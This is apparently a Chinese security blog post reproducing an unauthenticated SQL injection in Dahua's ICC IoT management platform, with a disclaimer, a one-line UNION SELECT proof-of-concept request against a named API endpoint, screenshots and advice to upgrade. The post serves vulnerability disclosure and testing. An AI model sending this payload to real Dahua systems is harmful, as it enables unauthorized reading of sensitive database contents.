#  【漏洞复现】大华ICC智能物联管理平台SQL注入漏洞  
PokerSec
                    PokerSec  PokerSec   2026-01-20 01:00  
  
   
  
**先关注，不迷路.**  
## 免责声明  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 漏洞介绍  
  
大华ICC智能物联综合管理平台的/evo-apigw/evo-arsm/1.0.0/ars/list接口存在SQL注入漏洞，未经身份验证的攻击者可以通过该漏洞执行任意SQL语句，从而获取数据库敏感信息。  
## 漏洞复现  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJKVx0icQ3nsSQwyRTxSYLWNjqpySCvue3g8VGSzMdvvfvmgtiaziaqrTNoL7EYzvlSeA73WDvSZ2UppA/640?wx_fmt=png&from=appmsg "null")  
  
  
POC:  
  
(这微信页面直接复制代码格式会乱，可以浏览器打开复制)  
```
/evo-apigw/evo-arsm/1.0.0/ars/list?serviceName=%27+UNION+ALL+SELECT+NULL,NULL,NULL,CONCAT(0x7e,md5(2),0x7e),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJKVx0icQ3nsSQwyRTxSYLWNjVUUlZo3HGWibtFjzjybg6a2uFabXTubua4bry2z3B3a3PrWNq5ITdfg/640?wx_fmt=png&from=appmsg "null")  
  
## 修复意见  
  
目前官方已发布漏洞修复版本，建议用户升级到安全版本：  
  
https://www.dahuatech.com/  
  
   
  
  
